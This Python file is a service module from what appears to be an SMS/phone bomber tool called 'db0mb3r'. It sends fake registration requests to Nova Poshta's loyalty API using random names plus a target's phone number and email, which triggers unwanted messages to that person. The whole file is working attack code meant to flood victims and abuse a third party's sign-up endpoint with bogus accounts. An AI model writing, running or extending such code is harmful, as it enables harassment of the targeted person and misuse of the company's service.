import random

from db0mb3r.services.service import Service


class NovaPoshta(Service):
    phone_codes = [7]

    async def run(self):
        name = "".join(random.choices("Іїє", k=random.randint(3, 5)))

        await self.post(
            "https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration",
            json={
                "modelName": "LoyaltyUserGeneral",
                "calledMethod": "registration",
                "system": "PA 3.0",
                "methodProperties": {
                    "City": "8d5a980d-391c-11dd-90d9-001a92567626",
                    "FirstName": name,
                    "LastName": name,
                    "Patronymic": name,
                    "Phone": f"0{self.phone}",
                    "Email": self.email,
                    "BirthDate": "02.02.2010",
                    "Password": "0c465655c53d2d8ec971581f5dfdbd83",
                    "Gender": "M",
                    "CounterpartyType": "PrivatePerson",
                    "MarketplacePartnerToken": "005056887b8d-b5da-11e6-9f54-cea38574",
                },
            },
        )
